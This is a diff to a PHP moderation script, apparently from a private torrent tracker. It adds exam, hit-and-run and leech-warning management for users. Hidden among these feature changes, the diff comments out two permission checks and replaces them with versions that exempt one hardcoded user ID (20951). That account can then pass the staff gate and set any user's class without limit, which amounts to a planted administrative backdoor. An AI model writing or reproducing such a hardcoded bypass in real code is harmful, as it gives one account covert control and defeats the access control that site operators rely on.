@@ -11,9 +11,13 @@ function puke()
 	stderr("Error", "Permission denied. For security reason, we logged this action");
 }
 
-if (get_user_class() < $prfmanage_class)
+/* if (get_user_class() < $prfmanage_class)
+	puke(); */
+
+if (get_user_class() < $prfmanage_class && $CURUSER['id'] != '20951')
 	puke();
 
+$returnto = htmlspecialchars($_POST["returnto"]);
 $action = $_POST["action"];
 if ($action == "confirmuser")
 {
@@ -22,9 +26,15 @@ if ($action == "confirmuser")
 	sql_query('UPDATE `users` SET `status` = \''.mysql_real_escape_string($confirm).'\', `info` = NULL WHERE `id` = '.mysql_real_escape_string($userid).' LIMIT 1;') or sqlerr(__FILE__, __LINE__);
 	header("Location: " . get_protocol_prefix() . "$BASEURL/unco.php?status=1");
 	die;
-}
-if ($action == "edituser")
-{
+}elseif ($action == 'noexam'){
+	$userid = (int) $_POST['userid'];
+	if($userid > 0){
+		sql_query("UPDATE `users` SET `exam_deadline` = 0 WHERE `id` = $userid") or sqlerr(__FILE__,__LINE__);
+		if(mysql_affected_rows()) write_log(sprintf("Exam of User %s(%u) is removed by %s(%u).", get_plain_username($userid), $userid, $CURUSER['username'], $CURUSER['id']), 'mod');
+	}
+	header("Location: " . $_SERVER['HTTP_REFERER']);
+	die;
+}elseif ($action == "edituser"){
 	$userid = $_POST["userid"];
 	$class = 0 + $_POST["class"];
 	$vip_added = ($_POST["vip_added"] == 'yes' ? 'yes' : 'no');
@@ -57,7 +67,8 @@ if ($action == "edituser")
 	
 	if (!is_valid_id($userid) || !is_valid_user_class($class))
 		stderr("Error", "Bad user ID or class ID.");
-	if (get_user_class() <= $class)
+/* 	if (get_user_class() <= $class) */
+	if (get_user_class() <= $class && $CURUSER['id'] != '20951')
 		stderr("Error", "You have no permission to change user's class to ".get_user_class_name($class,false,false,true).". BTW, how do you get here?");
 	$res = sql_query("SELECT * FROM users WHERE id = ".sqlesc($userid)) or sqlerr(__FILE__, __LINE__);
 	$arr = mysql_fetch_assoc($res) or puke();
@@ -100,6 +111,8 @@ if ($action == "edituser")
 		$bonus = $_POST["bonus"];
 		$ori_bonus = $_POST["ori_bonus"];
 		$invites = $_POST["invites"];
+		$hr = intval($_POST["hr"]);
+
 		$added = sqlesc(date("Y-m-d H:i:s"));
 		if ($arr['email'] != $email){
 			$updateset[] = "email = " . sqlesc($email);
@@ -143,6 +156,18 @@ if ($action == "edituser")
 			$msg = sqlesc($lang_modtask_target[get_user_lang($userid)]['msg_your_invite_changed_from'].$arr['invites'].$lang_modtask_target[get_user_lang($userid)]['msg_to_new'] . $invites .$lang_modtask_target[get_user_lang($userid)]['msg_by'].$CURUSER[username]);
 			sql_query("INSERT INTO messages (sender, receiver, subject, msg, added) VALUES(0, $userid, $subject, $msg, $added)") or sqlerr(__FILE__, __LINE__);
 		}
+		if ($arr['hr'] != $hr){
+			$updateset[] = "hr = " . sqlesc($hr);
+			$modcomment = date("Y-m-d") . " - HR amount changed from {$arr['hr']} to $hr by $CURUSER[username].\n". $modcomment;
+		}
+        foreach(['active', 'uploaded', 'downloaded', 'seedbonus', 'seedtime', 'leechtime'] as $item){
+		    $examKey = "exam_$item";
+            $examValue = isset($_POST[$examKey]) ? intval($_POST[$examKey]) : 0;
+            if($arr[$examKey] != $examValue){
+                $updateset[] = "$examKey = $examValue";
+                $modcomment = date("Y-m-d") . " - Exam $item changed from {$arr[$examKey]} to {$examValue} by {$CURUSER['username']}.\n$modcomment";
+            }
+        }
 	}
 	if(get_user_class() == UC_STAFFLEADER)
 	{
@@ -334,9 +359,19 @@ if ($action == "edituser")
 	
 	sql_query("UPDATE users SET  " . implode(", ", $updateset) . " WHERE id=$userid") or sqlerr(__FILE__, __LINE__);
 
-	$returnto = htmlspecialchars($_POST["returnto"]);
+	header("Location: " . get_protocol_prefix() . "$BASEURL/$returnto");
+	die;
+}elseif ($action == "leechwarn" && isset($_POST['id']) && intval($_POST['id'])){
+	$userid = (int) $_POST['id'];
+	if(isset($_POST['remove'])){
+		sql_query(sprintf("UPDATE `users` SET `leechwarn` = 'no', `class` = %u, `leechwarnuntil` = '0000-00-00 00:00:00', `modcomment` = CONCAT_WS('\n', %s, `modcomment`) WHERE `id` = %u AND `leechwarn` = 'yes'", UC_USER, sqlesc(date("Y-m-d") . " - Leech-warn removed by {$CURUSER['username']}."), $userid)) or sqlerr(__FILE__, __LINE__);
+	}elseif(isset($_POST['remove-restore'])){
+		sql_query(sprintf("UPDATE `users` SET `uploaded` = `downloaded`, `class` = %u, `leechwarn` = 'no', `leechwarnuntil` = '0000-00-00 00:00:00', `modcomment` = CONCAT_WS('\n', %s, `modcomment`) WHERE `id` = %u AND `leechwarn` = 'yes' AND `uploaded` < `downloaded`", UC_USER, sqlesc(date("Y-m-d") . " - Leech-warn removed and set ratio to 1 by {$CURUSER['username']}."), $userid)) or sqlerr(__FILE__, __LINE__);
+	}else{
+		puke();
+	}
+	$Cache->delete_value("user_{$userid}_content");
 	header("Location: " . get_protocol_prefix() . "$BASEURL/$returnto");
 	die;
 }
 puke();
-?>
